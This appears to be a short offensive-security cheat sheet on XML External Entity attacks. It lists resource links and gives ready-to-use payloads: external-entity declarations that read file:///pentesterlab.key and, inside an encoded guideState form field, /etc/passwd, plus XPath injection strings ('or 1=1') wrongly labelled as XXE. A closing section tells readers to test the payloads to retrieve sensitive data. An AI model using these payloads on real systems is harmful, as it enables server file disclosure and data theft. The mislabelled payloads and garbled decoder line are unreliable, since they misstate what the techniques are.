### **XXE (XML External Entity) Resources**

#### **1. Cheat Sheets & Guides**
- **Security Idiots XXE Cheat Sheet**:
  ```bash
  https://www.securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html
  ```
- **Discord Discussion**:
  ```bash
  https://discord.com/channels/1246401663787335721/1248927468358991973/1255248924139065474
  ```
- **Cave Confessions - XXE Ugly Side of XML**:
  ```bash
  https://caveconfessions.com/xxe-ugly-side-of-xml/
  ```

#### **2. Reading Response Data**
- **XML Decoder**:
  ```bash
  java version="1.7.0_111" class="java.beans.XMLDecoder
  ```

#### **3. XXE Payloads**
- **Basic Payload**:
  ```bash
  %27%20or%201=1] - usernames will appear
  ```
- **Advanced Payload**:
  ```bash
  hacker'%20or%201=1]/parent::*/child::node()%00 - use this payload to get all data in DB
  ```

#### **4. Entity Call**
- **Entity Call Syntax**:
  ```bash
  <!DOCTYPE%20test%20[<!ENTITY%20ent%20SYSTEM%20"file:///pentesterlab.key">%20]><test>%26ent;</test>
  ```

#### **5. Guide State Example**
- **Guide State Payload**:
  ```bash
  guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a"","guidePrefillXml"%3a"<%3fxml+version%3d\"1.0\"+encoding%3d\"utf-8\"%3f><!DOCTYPE+afData+[<!ENTITY+a+SYSTEM+\"file%3a///etc/passwd\">]><afData>%26a%3b</afData>"}}}
  ```

---

### **How to Use This Information**
1. **Cheat Sheets**:
   - Refer to the provided cheat sheets and guides for detailed XXE payloads and techniques.

2. **Reading Response Data**:
   - Use XML decoders to read and interpret response data from XXE vulnerabilities.

3. **Payload Testing**:
   - Test the provided payloads to exploit XXE vulnerabilities and retrieve sensitive data.

4. **Entity Call**:
   - Ensure correct syntax when calling entities, using `&` or `%26`.

5. **Guide State Example**:
   - Use the guide state example to craft payloads for specific applications or frameworks.

---
